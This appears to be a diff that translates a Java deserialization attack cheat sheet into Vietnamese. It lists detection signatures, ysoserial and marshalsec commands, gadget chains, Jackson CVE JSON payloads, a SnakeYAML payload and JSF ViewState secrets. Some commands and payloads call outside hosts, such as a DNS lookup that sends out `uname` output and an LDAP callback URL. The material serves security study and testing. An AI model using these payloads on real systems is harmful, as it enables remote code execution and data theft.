@@ -1,32 +1,34 @@
 # Java Deserialization
 
-> Java serialization is the process of converting a Java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between JVMs.
+> Java serialization là quá trình chuyển đổi trạng thái của một đối tượng Java thành một luồng byte, có thể được lưu trữ hoặc truyền đi, sau đó được tái tạo (deserialized) trở lại thành đối tượng ban đầu. Serialization trong Java chủ yếu được thực hiện bằng interface `Serializable`, interface này đánh dấu một class là có thể serialization, cho phép nó được lưu vào file, gửi qua mạng hoặc truyền giữa các JVM.
 
-## Summary
+## Tóm tắt
 
-* [Detection](#detection)
-* [Tools](#tools)
-    * [Ysoserial](#ysoserial)
-    * [Burp extensions using ysoserial](#burp-extensions)
-    * [Alternative Tooling](#alternative-tooling)
+* [Phát hiện](#phát-hiện)
+* [Công cụ](#công-cụ)
+
+  * [Ysoserial](#ysoserial)
+  * [Các extension Burp sử dụng ysoserial](#burp-extensions)
+  * [Các công cụ thay thế](#alternative-tooling)
 * [YAML Deserialization](#yaml-deserialization)
 * [ViewState](#viewstate)
-* [References](#references)
+* [Tài liệu tham khảo](#references)
 
-## Detection
+## Phát hiện
 
-* `"AC ED 00 05"` in Hex
-    * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.
-    * `00 05`: STREAM_VERSION. The serialization version.
-* `"rO0"` in Base64
+* `"AC ED 00 05"` trong Hex
+
+  * `AC ED`: STREAM_MAGIC. Xác định đây là giao thức serialization.
+  * `00 05`: STREAM_VERSION. Phiên bản serialization.
+* `"rO0"` trong Base64
 * `Content-Type` = "application/x-java-serialized-object"
-* `"H4sIAAAAAAAAAJ"` in gzip(base64)
+* `"H4sIAAAAAAAAAJ"` trong gzip(base64)
 
-## Tools
+## Công cụ
 
 ### Ysoserial
 
-[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
+[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : Công cụ proof-of-concept dùng để tạo payload khai thác quá trình Java object deserialization không an toàn.
 
 ```java
 java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
@@ -35,9 +37,9 @@ java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
 java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
 ```
 
-**List of payloads included in ysoserial:**
+**Danh sách các payload được tích hợp trong ysoserial:**
 
-| Payload             | Authors                                | Dependencies                                                                                                                                                                                         |
+| Payload             | Tác giả                                | Dependencies                                                                                                                                                                                         |
 | ------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                       |
 | BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5                                                                                                                                                                                            |
@@ -76,63 +78,63 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
 
 ### Burp extensions
 
-* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) -  Burp extension to perform Java Deserialization Attacks
-* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) -  All-in-one plugin for Burp Suite for the detection and the exploitation of Java deserialization vulnerabilities
-* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  YSOSERIAL Integration with Burp Suite
-* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java Deserialization Vulnerability Identification
-* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java Deserialization Vulnerability Active Identification Burp Extender
+* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) - Extension Burp dùng để thực hiện các cuộc tấn công Java Deserialization
+* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) - Plugin all-in-one cho Burp Suite dùng để phát hiện và khai thác các lỗ hổng Java deserialization
+* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) - Tích hợp YSOSERIAL với Burp Suite
+* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Xác định lỗ hổng Java Deserialization bằng Burp
+* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Xác định chủ động lỗ hổng Java Deserialization bằng Burp Extender
 
-### Alternative Tooling
+### Các công cụ thay thế
 
-* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Pure JRE 8 RCE Deserialization gadget
-* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
-* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - A fork of the original ysoserial application
-* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
-* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
-* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Exploiting Deserialization to Brute-Force the Remote Classpath
-* [k3idii/Deserek](https://github.com/k3idii/Deserek) - Python code to Serialize and Unserialize java binary serialization format.
+* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Gadget RCE Deserialization thuần JRE 8
+* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - Công cụ xác minh và khai thác JBoss (và các lỗ hổng Java Deserialization khác)
+* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - Một fork của ứng dụng ysoserial gốc
+* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Công cụ brute force Java serialization
+* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - Công cụ dump các Java serialization stream dưới dạng dễ đọc hơn
+* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Khai thác Deserialization để brute-force Remote Classpath
+* [k3idii/Deserek](https://github.com/k3idii/Deserek) - Code Python để Serialize và Unserialize định dạng Java binary serialization.
 
-  ```java
-  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
-  python deserek.py yss_base.bin --format python > yss_url.py
-  python yss_url.py yss_new.bin
-  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
-  ```
+```java
+java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
+python deserek.py yss_base.bin --format python > yss_url.py
+python yss_url.py yss_new.bin
+java -cp JavaSerializationTestSuite DeSerial yss_new.bin
+```
 
-* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Turning your data into code execution
+* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Biến dữ liệu của bạn thành code execution
 
-  ```java
-  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
-  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
-  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
-  // -a - generates/tests all payloads for that marshaller
-  // -t - runs in test mode, unmarshalling the generated payloads after generating them.
-  // -v - verbose mode, e.g. also shows the generated payload in test mode.
-  // gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
-  // arguments - Gadget specific arguments
-  ```
+```java
+$ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
+$ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
+$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
+// -a - tạo/kiểm thử tất cả payload cho marshaller đó
+// -t - chạy ở chế độ kiểm thử, unmarshalling các payload đã tạo sau khi tạo chúng.
+// -v - chế độ verbose, ví dụ hiển thị cả payload được tạo trong chế độ kiểm thử.
+// gadget_type - định danh của một gadget cụ thể; nếu bỏ trống sẽ hiển thị các gadget khả dụng cho marshaller cụ thể đó.
+// arguments - các argument dành riêng cho gadget
+```
 
-Payload generators for the following marshallers are included:
+Các payload generator cho những marshaller sau được tích hợp:
 
-| Marshaller                  | Gadget Impact                                                                |
-| --------------------------- | ---------------------------------------------------------------------------- |
-| BlazeDSAMF(0&#124;3&#124;X) | JDK only escalation to Java serialization various third party libraries RCEs |
-| Hessian&#124;Burlap         | various third party RCEs                                                     |
-| Castor                      | dependency library RCE                                                       |
-| Jackson                     | **possible JDK only RCE**, various third party RCEs                          |
-| Java                        | yet another third party RCE                                                  |
-| JsonIO                      | **JDK only RCE**                                                             |
-| JYAML                       | **JDK only RCE**                                                             |
-| Kryo                        | third party RCEs                                                             |
-| KryoAltStrategy             | **JDK only RCE**                                                             |
-| Red5AMF(0&#124;3)           | **JDK only RCE**                                                             |
-| SnakeYAML                   | **JDK only RCEs**                                                            |
-| XStream                     | **JDK only RCEs**                                                            |
-| YAMLBeans                   | third party RCE                                                              |
+| Marshaller        | Gadget Impact                                                                         |
+| ----------------- | ------------------------------------------------------------------------------------- |
+| BlazeDSAMF(0|3|X) | Chỉ JDK escalation sang Java serialization và RCE thông qua nhiều thư viện bên thứ ba |
+| Hessian|Burlap    | Nhiều RCE thông qua thư viện bên thứ ba                                               |
+| Castor            | RCE thông qua thư viện dependency                                                     |
+| Jackson           | **Có khả năng RCE chỉ với JDK**, RCE thông qua nhiều thư viện bên thứ ba              |
+| Java              | Một dạng RCE khác thông qua thư viện bên thứ ba                                       |
+| JsonIO            | **RCE chỉ với JDK**                                                                   |
+| JYAML             | **RCE chỉ với JDK**                                                                   |
+| Kryo              | RCE thông qua thư viện bên thứ ba                                                     |
+| KryoAltStrategy   | **RCE chỉ với JDK**                                                                   |
+| Red5AMF(0|3)      | **RCE chỉ với JDK**                                                                   |
+| SnakeYAML         | **RCE chỉ với JDK**                                                                   |
+| XStream           | **RCE chỉ với JDK**                                                                   |
+| YAMLBeans         | RCE thông qua thư viện bên thứ ba                                                     |
 
 ## JSON Deserialization
 
-Multiple libraries can be used to handle JSON in Java.
+Có nhiều thư viện có thể được sử dụng để xử lý JSON trong Java.
 
 * [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
 * [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
@@ -143,10 +145,11 @@ Multiple libraries can be used to handle JSON in Java.
 
 **Jackson**:
 
-Jackson is a popular Java library used for working with JSON (JavaScript Object Notation) data.
-Jackson-databind supports Polymorphic Type Handling (PTH), formerly known as "Polymorphic Deserialization", which is disabled by default.
+Jackson là một thư viện Java phổ biến được sử dụng để làm việc với dữ liệu JSON (JavaScript Object Notation).
 
-To determine if the backend is using Jackson, the most common technique is to send an invalid JSON and inspect the error message. Look for references to either of those:
+Jackson-databind hỗ trợ Polymorphic Type Handling (PTH), trước đây được gọi là "Polymorphic Deserialization", và tính năng này bị vô hiệu hóa theo mặc định.
+
+Để xác định backend có đang sử dụng Jackson hay không, kỹ thuật phổ biến nhất là gửi một JSON không hợp lệ và kiểm tra thông báo lỗi. Hãy tìm các tham chiếu đến một trong hai thành phần sau:
 
 ```java
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
@@ -155,7 +158,7 @@ Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.
 * com.fasterxml.jackson.databind
 * org.codehaus.jackson.map
 
-**Exploitation**:
+**Khai thác**:
 
 * **CVE-2017-7525**
 
@@ -172,7 +175,7 @@ Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.
       }
     ]
   }
-    ```
+  ```
 
 * **CVE-2017-17485**
 
@@ -209,14 +212,14 @@ Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.
 
 * **CVE-2020-9548**
 
-    ```json
-    [
-      "br.com.anteros.dbcp.AnterosDBCPConfig",
-      {
-        "healthCheckRegistry": "ldap://{{interactsh-url}}"
-      }
-    ]
-    ```
+  ```json
+  [
+    "br.com.anteros.dbcp.AnterosDBCPConfig",
+    {
+      "healthCheckRegistry": "ldap://{{interactsh-url}}"
+    }
+  ]
+  ```
 
 ## YAML Deserialization
 
@@ -226,7 +229,7 @@ Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.
 
 **SnakeYAML**:
 
-SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language) data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used for configuration files and data exchange.
+SnakeYAML là một thư viện Java phổ biến được sử dụng để phân tích cú pháp và tạo YAML (YAML Ain't Markup Language). Thư viện cung cấp API dễ sử dụng để làm việc với YAML, một tiêu chuẩn serialization dữ liệu dạng text dễ đọc, thường được sử dụng cho các file cấu hình và trao đổi dữ liệu.
 
 ```yaml
 !!javax.script.ScriptEngineManager [
@@ -238,15 +241,15 @@ SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YA
 
 ## ViewState
 
-In Java, ViewState refers to the mechanism used by frameworks like JavaServer Faces (JSF) to maintain the state of UI components between HTTP requests in web applications. There are 2 major implementations:
+Trong Java, ViewState đề cập đến cơ chế được các framework như JavaServer Faces (JSF) sử dụng để duy trì trạng thái của các thành phần UI giữa các HTTP request trong ứng dụng web. Có 2 implementation chính:
 
-* Oracle Mojarra (JSF reference implementation)
+* Oracle Mojarra (implementation tham chiếu của JSF)
 * Apache MyFaces
 
-**Tools**:
+**Công cụ**:
 
-* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool
-* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace is a software used to patch unencrypted and unsigned JSF ViewStates.
+* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Công cụ xác minh và khai thác Jboss (và các lỗ hổng Java Deserialization)
+* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace là phần mềm dùng để patch các JSF ViewState không được mã hóa và không được ký.
 
 ### Encoding
 
@@ -257,23 +260,24 @@ In Java, ViewState refers to the mechanism used by frameworks like JavaServer Fa
 
 ### Storage
 
-The `javax.faces.STATE_SAVING_METHOD` is a configuration parameter in JavaServer Faces (JSF). It specifies how the framework should save the state of a component tree (the structure and data of UI components on a page) between HTTP requests.
+`javax.faces.STATE_SAVING_METHOD` là một tham số cấu hình trong JavaServer Faces (JSF). Nó xác định cách JSF lưu trạng thái của một component tree (cấu trúc và dữ liệu của các component trên một trang) giữa các HTTP request.
 
-The storage method can also be inferred from the viewstate representation in the HTML body.
+Phương thức lưu trữ cũng có thể được suy ra từ biểu diễn của viewstate trong HTML body.
 
 * **Server side** storage: `value="-XXX:-XXXX"`
 * **Client side** storage: `base64 + gzip + Java Object`
 
 ### Encryption
 
-By default MyFaces uses DES as encryption algorithm and HMAC-SHA1 to authenticate the ViewState. It is possible and recommended to configure more recent algorithms like AES and HMAC-SHA256.
+Theo mặc định, MyFaces sử dụng DES làm thuật toán mã hóa và HMAC-SHA1 để xác thực ViewState. Có thể và được khuyến nghị cấu hình các thuật toán mới hơn như AES và HMAC-SHA256.
 
 | Encryption Algorithm | HMAC      |
 | -------------------- | --------- |
 | DES ECB (default)    | HMAC-SHA1 |
 
-Supported encryption methods are BlowFish, 3DES, AES and are defined by a context parameter.
-The value of these parameters and their secrets can be found inside these XML clauses.
+Các phương thức mã hóa được hỗ trợ gồm BlowFish, 3DES và AES, được định nghĩa thông qua một context parameter.
+
+Giá trị của các parameter này và các secret của chúng có thể được tìm thấy trong các XML clause sau.
 
 ```xml
 <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
@@ -281,7 +285,7 @@ The value of these parameters and their secrets can be found inside these XML cl
 <param-name>org.apache.myfaces.MAC_SECRET</param-name>
 ```
 
-Common secrets from the [documentation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).
+Các secret phổ biến từ [documentation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).
 
 | Name                 | Value                              |
 | -------------------- | ---------------------------------- |
@@ -308,8 +312,8 @@ Common secrets from the [documentation](https://cwiki.apache.org/confluence/disp
 * [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://web.archive.org/web/20250909154616/https://www.exploit-db.com/docs/48126)
 * [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://web.archive.org/web/20160315020109/http://synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
 * [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://web.archive.org/web/20181217131654/https://alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
-* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://web.archive.org/web/20201207032909/https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)
+* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://web.archive.org/web/20201207032909/https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e806)
 * [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://web.archive.org/web/20260210022416/https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
 * [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://web.archive.org/web/20250604040229/https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
 * [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://web.archive.org/web/20250604034046/https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
-* [Friday the 13th JSON Attacks - Alvaro Muñoz & Oleksandr Mirosh - July 28, 2017](https://web.archive.org/web/20170728193005/https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
+* [Friday the 13th JSON Attacks - Alvaro Muñoz & Oleksandr Mirosh - July 28, 2017](https://web.archive.org/web/20170728193005/https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-the-13th-JSON-Attacks-wp.pdf)
